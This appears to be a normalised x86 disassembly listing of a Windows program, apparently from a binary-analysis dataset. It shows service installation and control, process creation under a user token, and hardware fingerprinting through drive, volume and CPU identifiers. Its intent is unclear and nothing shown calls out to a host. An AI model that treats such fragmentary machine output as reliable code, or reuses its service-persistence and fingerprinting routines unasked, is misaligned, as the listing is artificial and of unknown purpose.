call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x2d0 ]
jne r-xdata
cmp [ ebp - 0x29c ] 0x0
je r-xdata
mov edx [ ebp - 0x2ac ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x2b0 ]
push eax
call [ CloseHandle@IAT ]
xor edx edx
mov [ ebp - 0x2b0 ] edx
mov [ ebp - 0x2ac ] edx
mov [ ebp - 0x2a8 ] edx
mov [ ebp - 0x2a4 ] edx
lea eax [ ebp - 0x2b0 ]
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push 0x0
mov edx [ ebp - 0x2a0 ]
push edx
mov eax [ ebp - 0x2c8 ]
push eax
push 0x0
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
push 0x0
mov ecx [ ebp - 0x29c ]
push ecx
call [ CreateProcessAsUserW@IAT ]
mov [ ebp - 0x2c0 ] eax
cmp [ ebp - 0x2b0 ] 0x0
je r-xdata
mov eax [ ebp - 0x2bc ]
push eax
call [ CloseHandle@IAT ]
xor al al
jmp r-xdata
mov edx [ ebp - 0x28c ]
mov [ ebp - 0x2cc ] edx
jmp r-xdata
cmp [ ebp - 0x2bc ] 0x0
je r-xdata
mov ecx [ ebp - 0x29c ]
push ecx
call [ CloseHandle@IAT ]
cmp [ ebp - 0x298 ] 0x0
je r-xdata
mov edx [ ebp - 0x2bc ]
push edx
call [ CloseHandle@IAT ]
cmp [ ebp - 0x2a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x298 ]
push eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x2c0 ] 0x0
je r-xdata
mov ecx [ ebp - 0x2a0 ]
push ecx
call [ DestroyEnvironmentBlock@IAT ]
mov [ ebp - 0x2b5 ] 0x0
mov [ ebp - 0x2b5 ] 0x1
jmp r-xdata
mov al [ ebp - 0x2b5 ]
sub_41f5e0
push ebp
mov ebp esp
push 0xffffffff
push sub_43c2d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x48 ] ecx
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_41fb90
mov [ ebp - 0x4 ] 0x0
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40be90
mov [ ebp - 0x3c ] eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x3c ]
push ecx
push 0x1
push 0x2
push 0x10
push 0xf01ff
lea ecx [ ebp - 0x28 ]
call sub_40be90
push eax
mov ecx [ ebp + 0xc ]
call sub_40be90
push eax
mov edx [ ebp - 0x38 ]
push edx
call [ CreateServiceW@IAT ]
mov [ ebp - 0x34 ] eax
call [ GetLastError@IAT ]
xor ecx ecx
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] ecx
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x2e ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov al [ ebp - 0x2e ]
jmp r-xdata
mov [ ebp - 0x2c ] r--data
lea edx [ ebp - 0x2c ]
push edx
push 0x1
mov eax [ ebp - 0x34 ]
push eax
call [ ChangeServiceConfig2W@IAT ]
mov ecx [ ebp - 0x34 ]
push ecx
call [ CloseServiceHandle@IAT ]
mov [ ebp - 0x2d ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov al [ ebp - 0x2d ]
mov [ ebp - 0x2f ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov al [ ebp - 0x2f ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_41f720
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] ecx
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
push 0xf01ff
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
mov eax [ ebp - 0x28 ]
push eax
call [ OpenServiceW@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
call [ QueryServiceStatus@IAT ]
mov [ ebp - 0x1c ] 0x1
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x28 ]
push ecx
call [ CloseServiceHandle@IAT ]
mov edx [ ebp - 0x24 ]
push edx
call [ CloseServiceHandle@IAT ]
mov al 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
push eax
call [ StartServiceW@IAT ]
sub_41f7d0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] ecx
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
push 0xf01ff
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
mov eax [ ebp - 0x28 ]
push eax
call [ OpenServiceW@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
call [ QueryServiceStatus@IAT ]
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov al 0x1
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx [ ebp - 0x24 ]
push ecx
call [ ControlService@IAT ]
sub_41f860
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] ecx
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
push 0xf01ff
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
mov eax [ ebp - 0x28 ]
push eax
call [ OpenServiceW@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x24 ]
push eax
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x24 ]
push ecx
call [ CloseServiceHandle@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov al 0x1
xor al al
jmp r-xdata
sub_41f900
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
push rw-data
mov ecx [ rw-data ]
push ecx
call [ SetServiceStatus@IAT ]
mov [ rw-data ] 0x0
cmp [ ebp - 0x4 ] 0x2
je r-xdata
mov [ rw-data ] 0x7
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov [ rw-data ] 0x4
jmp r-xdata
jmp r-xdata
sub_41f980
push ebp
mov ebp esp
mov [ rw-data ] 0x30
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
push sub_41f900
mov ecx rw-data
call sub_40be90
push eax
call [ RegisterServiceCtrlHandlerW@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x4
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
push rw-data
mov eax [ rw-data ]
push eax
call [ SetServiceStatus@IAT ]
mov [ rw-data ] 0x1
jmp r-xdata
pop ebp
retn 0x8
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub_41fa50
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
lea ecx [ ebp - 0x5 ]
call sub_41fa90
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41fa90
push ebp
mov ebp esp
push 0xffffffff
push sub_43c2a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x30 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_40bd80
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0x0
push r--data
mov edx [ ebp - 0x2c ]
push edx
call sub_41fbf0
add esp 0x8
mov [ ebp - 0x22 ] al
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
call sub_40bdc0
movzx eax [ ebp - 0x22 ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx rw-data
call sub_40bde0
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] sub_41f980
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
call [ StartServiceCtrlDispatcherW@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push r--data
push sub_41fa50
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov al 0x1
jmp r-xdata
mov [ ebp - 0x21 ] 0x0
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov cl [ ebp - 0x21 ]
mov [ ebp - 0x23 ] cl
mov al [ ebp - 0x23 ]
sub_41fb90
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x2 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401a60
mov ecx eax
call sub_401a80
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40c030
mov edx [ r--data ]
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40c190
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_41fbf0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41e9c0
add esp 0x8
movzx edx al
test edx edx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41fc30
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ ebp - 0xc ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_41fc90
push ebp
mov ebp esp
push ecx
push 0x0
push 0x0
push 0x3
push 0x0
push 0x3
push 0xc0000000
mov eax [ ebp + 0x8 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41fcc0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0x20
push 0x40
call [ GlobalAlloc@IAT ]
mov [ ebp - 0xc ] eax
push 0x210
push 0x40
call [ GlobalAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0xa ] 0xec
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x10 ]
mov [ edx ] 0x200
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x210
mov ecx [ ebp - 0x10 ]
push ecx
push 0x20
mov edx [ ebp - 0xc ]
push edx
push 0x7c088
mov eax [ ebp + 0x8 ]
push eax
call [ DeviceIoControl@IAT ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
add esi 0x10
mov ecx 0x80
mov edi [ ebp + 0xc ]
[ edi ] [ esi ]
mov ecx [ ebp - 0x10 ]
push ecx
call [ GlobalFree@IAT ]
mov edx [ ebp - 0xc ]
push edx
call [ GlobalFree@IAT ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_41fd70
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
mov al [ edx + 0x1 ]
mov [ ecx ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x1 ]
mov [ ecx + 0x1 ] dl
jmp r-xdata
mov ecx [ ebp + 0xc ]
sub ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_421ef0
add esp 0xc
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
movsx edx [ ecx ]
cmp edx 0x20
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
movsx eax [ edx ]
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
sub_41fe40
push ebp
mov ebp esp
push 0xffffffff
push sub_43c378
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
test eax eax
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401790
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_401890
test eax eax
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_401790
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x34 ] 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_420990
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
call sub_401890
add eax [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_401890
push eax
mov eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_420960
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_420990
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0x30 ]
cmp ecx [ r--data ]
je r-xdata
sub_41ff60
push ebp
mov ebp esp
push 0xffffffff
push sub_43c378
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov eax [ ebp - 0x34 ]
or eax 0x1
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call sub_401890
cmp [ ebp - 0x30 ] eax
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_410020
mov edx [ ebp - 0x34 ]
or edx 0x1
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_410210
movsx cx [ eax ]
mov [ ebp - 0x2c ] cx
movzx edx [ ebp - 0x2c ]
cmp edx 0x30
jl r-xdata
movzx ecx [ ebp - 0x2c ]
cmp ecx 0x41
jl r-xdata
movzx eax [ ebp - 0x2c ]
cmp eax 0x39
jle r-xdata
movzx eax [ ebp - 0x2c ]
cmp eax 0x61
jl r-xdata
movzx edx [ ebp - 0x2c ]
cmp edx 0x5a
jle r-xdata
jmp r-xdata
movzx edx [ ebp - 0x2c ]
cmp edx 0x2d
jne r-xdata
movzx ecx [ ebp - 0x2c ]
cmp ecx 0x7a
jle r-xdata
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_410210
mov [ eax ] 0x58
jmp r-xdata
sub_420090
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
call [ wsprintfW@IAT ]
add esp 0xc
lea edx [ ebp - 0x2c ]
push edx
call sub_41fc90
add esp 0x4
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x30 ]
push ecx
call sub_41fcc0
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x34 ]
push 0x14
mov edx [ ebp + 0xc ]
add edx 0x14
push edx
call sub_41fd70
add esp 0x8
push 0x28
mov eax [ ebp + 0xc ]
add eax 0x36
push eax
call sub_41fd70
add esp 0x8
push 0x8
mov ecx [ ebp + 0xc ]
add ecx 0x2e
push ecx
call sub_41fd70
add esp 0x8
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_420140
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x1
call sub_41fc30
test eax eax
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push 0x20019
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push 0x20219
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x10 ]
push ecx
push 0x20219
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
push eax
call [ RegCloseKey@IAT ]
sub_420220
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
push r--data
push 0x80000002
call sub_420140
add esp 0x14
pop ebp
retn
sub_420250
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax 0x1
xor edx edx
cpuid
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
push r--data
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42298e
add esp 0x14
mov eax 0x1
sub_4202c0
push ebp
mov ebp esp
push 0xffffffff
push sub_43c342
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax 0x2
imul eax eax 0x0
movzx ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x6ac ]
push eax
push 0x0
call sub_420090
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x6c0 ] rw-data
mov edx [ ebp - 0x6c0 ]
add edx 0x2
mov [ ebp - 0x6f4 ] edx
xor eax eax
mov [ ebp - 0x38 ] ax
xor ecx ecx
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] ecx
mov [ ebp - 0x2e ] ecx
mov [ ebp - 0x2a ] ecx
mov [ ebp - 0x26 ] ecx
mov [ ebp - 0x22 ] ecx
mov [ ebp - 0x1e ] ecx
mov [ ebp - 0x1a ] ecx
mov [ ebp - 0x16 ] ecx
mov [ ebp - 0x12 ] cx
xor edx edx
mov [ ebp - 0x60 ] dx
xor eax eax
mov [ ebp - 0x5e ] eax
mov [ ebp - 0x5a ] eax
mov [ ebp - 0x56 ] eax
mov [ ebp - 0x52 ] eax
mov [ ebp - 0x4e ] eax
mov [ ebp - 0x4a ] eax
mov [ ebp - 0x46 ] eax
mov [ ebp - 0x42 ] eax
mov [ ebp - 0x3e ] eax
mov [ ebp - 0x3a ] ax
push 0xff
lea ecx [ ebp - 0x60 ]
push ecx
lea edx [ ebp - 0x4a8 ]
push edx
lea eax [ ebp - 0x4ac ]
push eax
lea ecx [ ebp - 0x474 ]
push ecx
push 0xff
lea edx [ ebp - 0x38 ]
push edx
push 0x0
call [ GetVolumeInformationW@IAT ]
xor eax eax
mov [ ebp - 0x470 ] ax
push 0x40e
push 0x0
lea ecx [ ebp - 0x46e ]
push ecx
call sub_427900
add esp 0xc
push 0x208
lea edx [ ebp - 0x470 ]
push edx
call sub_420250
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x698 ]
push ecx
lea ecx [ ebp - 0x48c ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0x720 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x738 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x2
lea edx [ ebp - 0x720 ]
push edx
lea eax [ ebp - 0x738 ]
push eax
lea ecx [ ebp - 0x48c ]
push ecx
lea edx [ ebp - 0x7c8 ]
push edx
call sub_41fe40
add esp 0x10
mov [ ebp - 0x6fc ] eax
mov eax [ ebp - 0x6fc ]
push eax
lea ecx [ ebp - 0x48c ]
call sub_410070
lea ecx [ ebp - 0x7c8 ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x738 ]
call sub_401830
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x720 ]
call sub_401830
lea ecx [ ebp - 0x676 ]
push ecx
lea ecx [ ebp - 0x4a4 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x3
push r--data
lea ecx [ ebp - 0x750 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x4
push r--data
lea ecx [ ebp - 0x768 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x5
lea edx [ ebp - 0x750 ]
push edx
lea eax [ ebp - 0x768 ]
push eax
lea ecx [ ebp - 0x4a4 ]
push ecx
lea edx [ ebp - 0x780 ]
push edx
call sub_41fe40
add esp 0x10
mov [ ebp - 0x6dc ] eax
mov eax [ ebp - 0x6dc ]
push eax
lea ecx [ ebp - 0x4a4 ]
call sub_410070
lea ecx [ ebp - 0x780 ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x768 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x750 ]
call sub_401830
lea ecx [ ebp - 0x48c ]
call sub_401870
push eax
lea ecx [ ebp - 0x798 ]
push ecx
call sub_41ff60
add esp 0x8
mov [ ebp - 0x6e0 ] eax
mov edx [ ebp - 0x6e0 ]
push edx
lea ecx [ ebp - 0x48c ]
call sub_410070
lea ecx [ ebp - 0x798 ]
call sub_401830
lea ecx [ ebp - 0x4a4 ]
call sub_401870
push eax
lea eax [ ebp - 0x7b0 ]
push eax
call sub_41ff60
add esp 0x8
